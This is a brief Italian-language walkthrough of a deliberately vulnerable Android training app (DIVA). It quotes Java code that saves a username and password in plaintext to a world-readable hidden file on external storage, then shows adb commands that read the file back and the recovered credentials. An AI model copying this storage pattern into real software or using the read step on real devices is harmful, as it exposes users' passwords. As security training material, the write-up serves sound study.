## Insecure Data Storage - Part 4

Codice Vulnerabile:

> app/src/main/java/jakhar/aseem/diva/InsecureDataStorage4Activity.java

```
File sdir = Environment.getExternalStorageDirectory();

...

File uinfo = new File(sdir.getAbsolutePath() + "/.uinfo.txt");
uinfo.setReadable(true);
uinfo.setWritable(true);
FileWriter fw = new FileWriter(uinfo);
fw.write(usr.getText().toString() + ":" + pwd.getText().toString() + "\n");
fw.close();
```

Exploit:

- `$ adb shell`

- `# cat /storage/emulated/0/.uinfo.txt`

```
john:lock
```
